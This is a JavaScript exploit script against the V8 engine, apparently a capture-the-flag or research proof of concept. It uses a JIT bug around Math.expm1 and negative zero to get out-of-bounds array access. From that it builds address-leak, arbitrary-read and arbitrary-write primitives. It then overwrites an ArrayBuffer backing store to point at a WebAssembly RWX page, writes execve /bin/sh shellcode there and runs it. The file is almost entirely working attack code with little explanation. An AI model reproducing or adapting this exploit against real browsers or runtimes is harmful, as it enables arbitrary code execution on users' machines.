// helpers
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

// convert float to integer
function ftoi(val) { // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

// convert integer to float
function itof(val) { // typeof(val) = BigInt
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

var hex = function(x){
  if (x < 0)
      return `-${hex(-x)}`;
  return `0x${x.toString(16)}`;
};

// stage 1
// trigger the bug to get oob access
console.log("[+] Stage 1: Use bug to get oob access!");

var oob_arr = undefined;

function jitme_daddy(x) {
  let o = {mz: -0}
  let i = Object.is(Math.expm1(x), o.mz);
  
  // overwrite length of oob_arr, not length of elements of oob_arr 
  i *= 11;  

  let a = [0.1, 0.2, 0.3, 0.4, 0.5];
  let b = [1.1, 1.2, 1.3, 1.4];

  oob_arr = b;
  a[i] += itof(0x414100000000n);
  // a[i] += itof(0x000400000000n);
  return a[i];
}

jitme_daddy(0);
// jitme ahhhhhh
for (let i=0;i<100000;i++)
  jitme_daddy("0");

// trigger vuln
console.log(hex(ftoi(jitme_daddy(-0))));
var victim = { prop: 0x69n };
var float_arr = [1.1, 1.2, 1.3, 1.4];       //0x1e
var obj_arr = [{a:1}, {b:2}, {c:3}];  //0x3a


var float_arr_elements = oob_arr[0x29];
var obj_arr_elements = oob_arr[0x3e];
console.log("obj_arr_map: 0x" + ftoi(oob_arr[0x3e]).toString(16));
console.log("float_arr_map: 0x" + ftoi(oob_arr[0x29]).toString(16));

function addrof(obj) {
  obj_arr[0] = obj;

  // replace elements of float_arr with elements of obj_arr
  oob_arr[0x29] = obj_arr_elements;
  
  // console.log("leak: 0x" + ftoi(float_arr[0]).toString(16));
  addr = float_arr[0];

  oob_arr[0x29] = float_arr_elements;
  return addr;
}

function arb_read(where) {
  // replace elements of float_arr with where we wanna read
  oob_arr[0x29] = where;

  val = float_arr[0];
  // console.log("leak: 0x" + ftoi(float_arr[0]).toString(16));

  oob_arr[0x29] = float_arr_elements;

  return val;
}

function arb_write(addr, val) {
  // replace elements of float_arr with where we wanna write
  // we overwrite the elements with address we want => start to access at addr+0x8
  oob_arr[0x29] = itof(ftoi(addr)-0x8n);
  
  float_arr[0] = val;

  oob_arr[0x29] = float_arr_elements;

}

var test = {o:1.1};
// wasm stuffs
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var wasm_instance_addr = addrof(wasm_instance);

console.log("wasm_instance_addr: 0x" + ftoi(wasm_instance_addr).toString(16));
var rwx = arb_read(itof(ftoi(wasm_instance_addr) + 0x60n-0x8n));
console.log("rwx: 0x" + ftoi(rwx).toString(16));
shellcode = [0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x48, 0xB9, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x51, 0x48, 0x89, 0xE7, 0x0F, 0x05]

var buf = new ArrayBuffer(0x100);
var dataview = new DataView(buf);
// var uint8_arr = new Uint8Array(buf)
var buf_addr = ftoi(addrof(buf));
// offset to backing store ptr at 0x60
var backing_addr = buf_addr + 0x14n;

console.log('[+] Writing over ArrayBuffer backing store at 0x' + (backing_addr).toString(16));

// arb_write(rwx, itof(backing_addr+0x8n));
arb_write(itof(backing_addr+0x8n), rwx);
console.log("[+] Copying shellcode...")
for (let i = 0; i < shellcode.length; i++) {
  dataview.setUint8(i, shellcode[i], true);
}

f();
// ##END_OF_FILE##
